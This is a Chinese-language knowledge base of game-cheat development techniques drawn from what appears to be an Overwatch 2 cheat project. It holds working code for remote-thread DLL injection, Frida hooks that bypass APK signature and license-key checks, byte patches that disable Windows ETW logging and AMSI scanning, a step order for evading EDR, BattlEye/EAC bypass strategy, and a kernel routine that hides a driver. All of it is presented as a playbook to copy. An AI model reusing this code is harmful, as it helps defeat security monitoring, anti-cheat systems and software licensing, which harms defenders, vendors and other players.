# WYX 游戏外挂开发经验库

> 从实际项目中提炼的实战经验，不是网上抄的教程

---

## OW2外挂开发经验（已验证）

### 环境配置

```powershell
# Rust环境（D盘）
$env:RUSTUP_HOME = "D:\rust\.rustup"
$env:CARGO_HOME = "D:\rust\.cargo"
$env:PATH = "D:\rust\.cargo\bin;D:\mingw64\mingw64\bin;$env:PATH"

# Cargo配置（D:\rust\.cargo\config.toml）
[target.x86_64-pc-windows-gnu]
linker = "x86_64-w64-mingw32-gcc"
ar = "x86_64-w64-mingw32-ar"
```

### 已知坑点

#### 1. DPI问题
**症状**: 截图坐标偏移，窗口定位不准
**原因**: Windows DPI缩放导致坐标计算错误
**解决**:
```rust
#[cfg(windows)]
unsafe {
    SetThreadDpiAwarenessContext(-3); // PER_MONITOR_AWARE_V2
}
```

#### 2. v8崩溃
**症状**: `grab_screen_v2` 函数崩溃，dump为None
**原因**: `GetDIBits` 被调用两次，第二次data=None
**解决**: 只调用一次GetDIBits，缓存结果

#### 3. Rust字面量溢出
**症状**: `error: integer literal out of range`
**原因**: Rust 1.98 禁止隐式溢出
**解决**:
```rust
// 错误
let val: i16 = 0x8000;

// 正确
let val = 0x8000u16 as i16;
```

#### 4. static mut限制
**症状**: `error: mutable references are not allowed in constants`
**原因**: Rust 2024对mutable static严格限制
**解决**:
```rust
use std::cell::UnsafeCell;

struct GameData {
    data: UnsafeCell<Vec<u8>>,
}
```

#### 5. dlltool缺失
**症状**: `error: cannot find -lmingw32`
**原因**: MinGW没有dlltool symlink
**解决**:
```powershell
New-Item -Path "D:\mingw64\mingw64\bin\x86_64-w64-mingw32-dlltool.exe" `
         -ItemType SymbolicLink -Target "dlltool.exe" -Force
```

### 编译命令

```bash
# 标准编译
export RUSTUP_HOME=/d/rust/.rustup
export CARGO_HOME=/d/rust/.cargo
export PATH="/d/rust/.cargo/bin:D:/mingw64/mingw64/bin:$PATH"
cargo build --release --target x86_64-pc-windows-gnu
```

---

## 游戏内存分析模式

### Entity List定位

**Unity游戏**:
```javascript
// 搜索"entity"相关字符串
// 或搜索"player"、"hero"、"unit"
// IL2CPP类名通常是 PascalCase
```

**UE4游戏**:
```javascript
// 搜索GWorld或UGameplayStatics
// UObject基址通常是静态指针
```

### Bone Matrix定位

```javascript
// 搜索"bone"、"skeleton"、"mesh"相关字符串
// 或搜索渲染相关函数
// 典型签名: GetBoneMatrix(int index)
```

### W2S投影

```javascript
// WorldToScreen函数参数：
// - Camera（视图矩阵）
// - Actor位置（世界坐标）
// - OutScreenPos（输出屏幕坐标）
// - bCameraToWorld（是否反转）
```

---

## DLL注入模式

### 注入方法对比

| 方法 | 优点 | 缺点 | 适用场景 |
|------|------|------|---------|
| Process Hacker | GUI友好，易用 | 需要手动操作 | 一次性注入 |
| Cheat Engine | 可视化，可调试 | 依赖CE安装 | 内存分析时注入 |
| CreateRemoteThread | 可编程，自动化 | 可能被检测 | 自动化框架 |
| Manual Map | 更隐蔽 | 实现复杂 | 对抗检测 |

### 完整注入流程

```rust
// 1. 打开进程
let handle = OpenProcess(
    PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
    FALSE,
    pid
)?;

// 2. 分配远程内存
let remote_addr = VirtualAllocEx(
    handle,
    None,
    dll_path.len() + 1,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_READWRITE
)?;

// 3. 写入DLL路径
WriteProcessMemory(handle, remote_addr, dll_path.as_ptr(), dll_path.len(), None)?;

// 4. 创建远程线程
let thread = CreateRemoteThread(
    handle,
    None,
    0,
    Some(load_library),
    remote_addr,
    0,
    None
)?;

// 5. 等待完成
WaitForSingleObject(thread, INFINITE)?;
```

---

## APK逆向模式

### 签名验证绕过

**Java层**:
```javascript
// Hook PackageManager.verifySignatures
var PM = Java.use("android.content.pm.PackageManager");
PM.verifySignatures.implementation = function() {
    return PackageManager.SIGNATURE_MATCH;
};
```

**Smali层**:
```smali
# 找到签名验证方法，直接return
.method public checkSignature()Z
    .registers_1
    const/4 v0, 0x1  # return true
    return v0
.end method
```

### 卡密验证绕过

**常见模式**:
1. 本地哈希比对
2. 网络请求验证
3. 硬件绑定检查

**绕过策略**:
```javascript
// 模式1: Hook验证函数
var LicenseChecker = Java.use("com.example.LicenseChecker");
LicenseChecker.checkLicense.implementation = function() {
    return true;
};

// 模式2: Hook返回值
var Response = Java.use("com.example.Response");
Response.isValid.implementation = function() {
    return true;
};
```

---

## EDR绕过模式

### ETW Patch（必须第一个执行）

```c
BOOL PatchEtwEventEnabled(void) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    FARPROC pEnabled = GetProcAddress(hNtdll, "EtwEventEnabled");

    // xor al, al; ret  (返回FALSE = provider未启用)
    BYTE patch[] = { 0x32, 0xC0, 0xC3 };
    DWORD oldProtect;
    VirtualProtect(pEnabled, 3, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(pEnabled, patch, 3);
    VirtualProtect(pEnabled, 3, oldProtect, &oldProtect);
    return TRUE;
}
```

### AMSI Patch

```c
BOOL PatchAmsiScanBuffer(void) {
    HMODULE hAmsi = LoadLibraryW(L"amsi.dll");
    FARPROC pScan = GetProcAddress(hAmsi, "AmsiScanBuffer");

    // xor eax, eax; ret; nop; nop
    BYTE patch[] = { 0x33, 0xC0, 0xC3, 0x90, 0x90 };
    DWORD oldProtect;
    VirtualProtect(pScan, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(pScan, patch, 5);
    VirtualProtect(pScan, 5, oldProtect, &oldProtect);
    return TRUE;
}
```

### 执行顺序（重要！）

```
1. ETW patch → 防止日志记录
2. AMSI patch → 防止脚本扫描
3. ntdll unhook → 恢复API链
4. syscall → 绕过用户态hook
5. PPID spoof → 降低异常度
```

---

## 反作弊绕过模式

### BattlEye/EAC绕过思路

```markdown
1. 用户态: unhook + syscall + ETW/AMSI patch
2. 内核态: DKOM隐藏 + 驱动签名
3. Hypervisor: EPT hook + VMX拦截
```

### 内核驱动隐藏

```c
VOID DKOM_HideDriver(PDRIVER_OBJECT driverObj) {
    if (driverObj && driverObj->DriverSection) {
        PLIST_ENTRY prev = (PLIST_ENTRY)((BYTE*)driverObj->DriverSection + 0x18);
        PLIST_ENTRY next = prev->Blink;
        prev->Flink = next;
        next->Blink = prev;
    }
}
```

---

## 经验总结

### 成功模式

1. **先静态后动态** - 不要一上来就Hook，先看代码结构
2. **Java层优先** - 大部分逻辑在Java层，Native层才有.so分析
3. **模板复用** - bypass-cheatsheet和native-hook-cheatsheet直接复制
4. **本地化配置** - 用真实路径，别假设标准路径

### 失败模式

1. **盲目改smali** - 没看Manifest和入口就改代码
2. **死磕Java层** - .so明显承载核心逻辑还继续看Java
3. **忽略DPI** - Windows游戏开发不处理DPI必崩
4. **顺序错误** - EDR绕过顺序错了会被先发现

---

## 更新记录

- 2026-09-13: 初始版本，融合OW2项目开发经验
- 后续持续更新...
